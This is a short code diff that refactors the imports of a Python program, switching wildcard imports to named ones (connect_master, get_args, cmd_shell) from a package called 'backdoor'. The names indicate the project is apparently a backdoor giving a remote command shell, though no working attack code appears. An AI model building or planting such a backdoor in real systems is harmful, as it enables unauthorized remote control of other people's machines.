@@ -1,6 +1,6 @@
-from lib.connection import *
-from lib.args import *
-from lib.backdoor import *
+from backdoor.connection import connect_master
+from backdoor.args import get_args
+from backdoor.backdoor import cmd_shell
 
 
 def main():
